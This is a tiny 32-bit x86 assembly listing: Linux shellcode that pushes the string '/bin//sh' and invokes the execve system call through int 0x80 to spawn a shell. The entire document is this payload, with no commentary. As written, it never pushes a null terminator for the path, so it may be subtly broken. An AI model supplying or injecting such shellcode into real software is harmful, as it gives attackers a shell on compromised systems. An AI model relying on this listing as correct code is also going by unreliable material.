BITS 32

	xor eax, eax
	
	push "//sh"
	push "/bin"

	xor edx, edx
	xor ecx, ecx
	mov ebx, esp

	push 11
	pop eax
	
	
	int 0x80
